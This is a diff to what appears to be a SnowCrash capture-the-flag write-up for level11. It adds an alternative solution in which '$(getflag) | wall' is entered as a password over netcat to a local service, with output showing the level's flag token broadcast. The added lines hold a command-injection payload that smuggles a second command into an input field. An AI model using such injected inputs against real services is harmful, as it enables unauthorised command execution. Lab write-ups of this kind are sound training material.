@@ -62,3 +62,15 @@ level11@SnowCrash:~$ cat /tmp/token
 Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
 ```
 
+ou 
+```shell
+level11@SnowCrash:~$ nc localhost 5151
+Password: $(getflag) | wall
+                                                                               
+Broadcast Message from flag11@Snow                                             
+        (somewhere) at 14:46 ...                                               
+                                                                               
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s                      
+                                                                               
+Erf nope..
+```
